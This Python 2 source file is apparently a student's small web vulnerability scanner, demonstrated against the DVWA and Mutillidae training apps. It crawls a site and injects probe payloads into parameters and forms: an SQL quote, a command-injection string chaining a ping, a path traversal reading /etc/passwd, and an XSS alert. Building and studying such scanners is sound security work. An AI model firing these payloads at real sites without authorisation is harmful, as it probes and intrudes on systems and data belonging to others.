import requests
import sys, time
import urlparse
from BeautifulSoup import BeautifulSoup

import argparse

headers = {
        'User-Agent': 'Mozilla/5.0'
    }

payloads = \
        [
            # list of payloads
            # this can be extended

            # Data strucutre:
            # [Payload, Attack_type, Error_message]

            # Could be extended to:
            # [Payload, Attack_type, [Error_message1, Error_message2, ... , Error_messageN]]

            ["'", "SQL Injection", "You have an error in your SQL syntax"],
            ["x; ping -c 1 127.0.0.1", "OS Command Injection", "PING 127.0.0.1"],
            ["../../../../../../../etc/passwd", "Local File Inclusion", "root:x:0:0:root:"],
            ["<script>alert(1)</script>", "XSS", "<script>alert(1)</script>"]
        ]


# Lets store all the vulnerabilities in a list

vulnerable = []


# Print nicely a vulnerability found

def report_vulnerability(vulnerability_type, page, parameter, method):
    print(' [*] Vulnerability found: \n Type: %s \n Page: %s \n Parameter: %s \n Method: %s \n' %
            (vulnerability_type, page, parameter, method))


# Get a cookie for DVWA

def dvwa_login(host):
    credentials = ['admin', '']

    username, password = credentials
    session = requests.session()
    try:
        response = session.post(host+'/login.php', data={'username': username, 'password': password, 'Login': 'Login'})
        cookie = requests.utils.dict_from_cookiejar(session.cookies)
        print(' [*] We have a DVWA cookie: %s' % cookie['PHPSESSID'])
    except:
        print(' [*] Ups! Something went wrong! Are you sure %s is up?' % host)
        sys.exit()
    return cookie


# Create a soup object from an URL
# If the URL contains logout we will ingore it > we don't want to kill the session

def soupify(host, cookie=''):
    if "logout" in host:
        return

    try:
        r = requests.get(host, cookies=cookie, headers=headers)

        # Might be a good idea to sleep for 1 or 2 seconds between requests
        #time.sleep(2)

        html_doc = r.text
        return BeautifulSoup(html_doc)

    except:
        return None

# Returns URL parameters
# Eg. http://example.com?p=1&p=2
# returns: p: ['1', '2']

def parse_url(url):
    parsed = urlparse.urlparse(url)
    return urlparse.parse_qs(parsed.query)


# Look for the links in an HTLM file after it has been soupify
# Checks if the url found is the same as the one in the orginal target (scoping)

def find_links(host, cookie=''):

    links = []
    target_domain = urlparse.urljoin(host, '/')

    soup = soupify(host, cookie=cookie)

    if soup is None:
        return

    for url in soup.findAll('a'):
        url = url.get('href')
        url = urlparse.urljoin(host, url)

        domain = urlparse.urljoin(url, '/')

        # We don't want to attack any website which is outside the scope of the assessment

        if domain == target_domain:
            links.append(url)

    return links


def find_forms(host, cookie=''):

    # Data strucutred returned:
    #   [URL, Form1, Form2, Form3, ... , FormN]
    #       FormI = [method(GET/POST), [Submit_Name, Submit_Value], Parameters]
    #           Parameters = [Parameter1, Parameter2, ... , ParameterN]

    # Parameters collected: input and select

    forms = []
    soup = soupify(host, cookie)

    # if this was a Logout page or there are no forms on the page exit function
    if (soup is None) or (len(soup('form')) == 0):
        return

    # we add the relevant URL from which we are collecting the forms
    forms.append(host)

    for i in range(len(soup('form'))):
        parameters = []
        form = []

        # Save the method type

        try:
            form.append(soup('form')[i]['method'])
        except:
            break
        # Get all the input fields

        for j in range(len(soup('form')[i]('input'))):
            try:
                if soup('form')[i]('input')[j]['type'] != 'submit':
                    parameters.append(soup('form')[i]('input')[j]['name'])
                else:

                    # Except if it is Submit

                    form.append([soup('form')[i]('input')[j]['value'], soup('form')[i]('input')[j]['name']])
            except:
                pass
        for j in range(len(soup('form')[i]('select'))):
            try:

                # Add the select name to the list of parameters

                parameters.append(soup('form')[i]('select')[j]['name'])
            except:
                pass

        # Add parameters and form to the list of forms for a particular URL
        # if no value for a submit is available add a default one

        if len(form) == 1:
            form.append(["", "Submit"])
        form.append(parameters)
        forms.append(form)

    return forms


def scanner(target, cookie=""):

    # if we have no cookie lets set one
    if cookie == "":
        session = requests.session()
        response = session.get(target)
        cookie = requests.utils.dict_from_cookiejar(session.cookies)

    pages_checked = []
    for target in find_links(target, cookie=cookie):
        if (target not in pages_checked) and ("logout" not in target):
            pages_checked.append(target)
            print " [*] Checking %s" % target
            links = find_links(target, cookie=cookie)
            for link in links:
                for k in payloads:
                    exploit(link, payload=k, cookie=cookie)

    return None


def exploit(target="#", payload=payloads[0], cookie=""):

    # Payload structure:
    # payload[0] = the actual payload
    # payload[1] = attack type
    # payload[2] = expected error message

    py = payload[0]
    attack_type = payload[1]
    error_message = payload[2]

    # GET parameters from the URL

    url = urlparse.urljoin(target, urlparse.urlparse(target).path)
    if parse_url(target) != {}:
        for param in parse_url(target):
            r = requests.get(url, cookies=cookie, headers=headers, params={param: py})
            if (error_message in r.text) and ([attack_type, target, param, "GET"] not in vulnerable):
                vulnerable.append([attack_type, target, param, "GET"])
                print(' [*] Found something.')

    # Lets look at the forms

    forms = find_forms(target, cookie=cookie)
    if forms is None:
        return

    url = forms[0]
    for i in range(1, len(forms)):
        if len(forms[i]) < 3:
            break
        if (forms[i][0]).upper() == "GET":
            for param in forms[i][2]:
                payload = {param: py, forms[i][1][1]: forms[i][1][0]}
                r = requests.get(url, cookies=cookie, headers=headers, params=payload)
                if (error_message in r.text) and ([attack_type, target, param, "GET"] not in vulnerable):
                    vulnerable.append([attack_type, target, param, "GET"])
                    print(' [*] Found something.')

        if (forms[i][0]).upper() == "POST":
            for param in forms[i][2]:
                payload = {param: py, forms[i][1][1]: forms[i][1][0]}
                r = requests.post(url, cookies=cookie, headers=headers, data=payload)
                if (error_message in r.text) and ([attack_type, target, param, "POST"] not in vulnerable):
                    vulnerable.append([attack_type, target, param, "POST"])
                    print(' [*] Found something.')

        return vulnerable


# try out all exploits
def exploit_all(host, cookie=""):
    for payload in payloads:
        exploit(host, payload=payload, cookie=cookie)

# Demo for DVWA

def demo(host):

    print(' [*] Testing DVWA ...')
    host = urlparse.urljoin(host, '/dvwa/')
    cookie = dvwa_login(host)
    print(' [*] Set the security level to low.')
    cookie['security'] = 'low'
    print (' [*] Scanning the application... \n')
    scanner(target=host, cookie=cookie)


    print('\n [*] Testing Mutillidae... \n')
    print(' [*] Testing Mutillidae user-info.php')
    host = urlparse.urljoin(host, '/mutillidae/index.php?page=user-info.php')
    for payload in payloads:
        exploit(host, payload=payload, cookie=cookie)

    print('\n [*] Testing Mutillidae dns-lookup.php')
    host = urlparse.urljoin(host, '/mutillidae/index.php?page=dns-lookup.php')
    exploit_all(host, cookie=cookie)

    print('\n [*] Testing Mutillidae dns-lookup.php')
    host = urlparse.urljoin(host, '/mutillidae/index.php?page=dns-lookup.php')
    exploit_all(host, cookie=cookie)

    print('\n [*] Testing Mutillidae arbitrary-file-inclusion.php')
    host = urlparse.urljoin(host, '/mutillidae/index.php?page=arbitrary-file-inclusion.php')
    exploit_all(host, cookie=cookie)

    return None


def main():
    print(' [*] Hi! Welcome to your tiny web vulnerability scanner')
    print(' [*] Author: R. GAVRILA ')
    print(' [*] MTA 2017 \n')
    print(' [*] URLs should look like: http://example.com/ \n')
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument('-d', action='store', help='URL Metasploitable (Demo)', dest='metasploitable')
    parser.add_argument('-s', action='store', help='URL to scan WebApp(might take long)', dest='scan')
    parser.add_argument('-e', action='store', help='URL to exploit', dest='exploit')

    restult = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if restult.metasploitable is not None:
        try:
            host = restult.metasploitable
            demo(host)
        except:
            print(' [*] Something went wrong. Exiting ... ')
            sys.exit(-1)

    if restult.scan is not None:
        try:
            host = restult.scan
            scanner(host, cookie='')
        except:
            print(' [*] Something went wrong. Exiting ... ')
            sys.exit(-1)

    if restult.exploit is not None:
        try:
            host = restult.exploit
            exploit_all(host, cookie='')
        except:
            print(' [*] Something went wrong. Exiting ... ')
            sys.exit(-1)

    print('\n [*] Report: \n')
    print(' [*] Vulnerabilities found: %d \n' % len(vulnerable))
    for item in vulnerable:
        report_vulnerability(vulnerability_type=item[0], page=item[1], parameter=item[2], method=item[3])

if __name__ == '__main__':
    main()


